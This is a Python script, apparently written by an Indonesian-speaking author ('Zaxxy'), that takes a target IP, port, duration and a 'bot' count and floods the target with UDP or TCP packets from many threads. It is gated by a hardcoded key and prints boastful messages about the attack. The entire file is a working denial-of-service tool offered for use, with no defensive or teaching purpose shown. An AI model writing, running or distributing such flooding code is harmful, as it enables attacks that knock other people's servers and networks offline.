import socket
import threading
import time

# Fungsi untuk serangan UDP flood
def udp_flood(ip, port, duration, bot_id):
    end_time = time.time() + duration
    packets_sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"ZAXXYONTOP" * 1024

    print(f"[BOT-{bot_id}] Memulai serangan UDP ke {ip}:{port} selama {duration} detik...")
    while time.time() < end_time:
        try:
            sock.sendto(payload, (ip, port))
            packets_sent += 1
        except:
            pass
    print(f"[BOT-{bot_id}] Serangan selesai. Total paket terkirim: {packets_sent}")

# Fungsi untuk serangan TCP flood
def tcp_flood(ip, port, duration, bot_id):
    end_time = time.time() + duration
    packets_sent = 0
    payload = b"ZAXXYONTOP" * 1024

    print(f"[BOT-{bot_id}] Memulai serangan TCP ke {ip}:{port} selama {duration} detik...")
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.sendall(payload)
            packets_sent += 1
            sock.close()
        except:
            pass
    print(f"[BOT-{bot_id}] Serangan selesai. Total paket terkirim: {packets_sent}")

# Input key otentikasi
key = input("Masukkan key: ")
if key != "zaxxyontop":
    print("Key salah! Keluar...")
    exit()

# Input parameter serangan
ip_target = input("Masukkan IP target: ")
port_target = int(input("Masukkan Port target: "))
attack_type = input("Masukkan jenis serangan (udp/tcp): ").lower()
bot_count = int(input("Masukkan jumlah bot: "))
threads = int(input("Masukkan jumlah Threads per bot: "))
duration = int(input("Masukkan durasi serangan (detik): "))

# Validasi jenis serangan
if attack_type not in ["udp", "tcp"]:
    print("Jenis serangan tidak valid! Keluar...")
    exit()

# Menjalankan bot
print(f"Attack telah dimulai oleh Zaxxy ganteng! Menyerang {ip_target}:{port_target} dengan {bot_count} bot...")
bot_threads = []

for bot_id in range(1, bot_count + 1):
    if attack_type == "udp":
        thread = threading.Thread(target=udp_flood, args=(ip_target, port_target, duration, bot_id))
    elif attack_type == "tcp":
        thread = threading.Thread(target=tcp_flood, args=(ip_target, port_target, duration, bot_id))
    thread.start()
    bot_threads.append(thread)

# Menunggu semua thread selesai
for thread in bot_threads:
    thread.join()

print("Serangan selesai. Zaxxy ganteng telah menunjukkan kekuatannya!")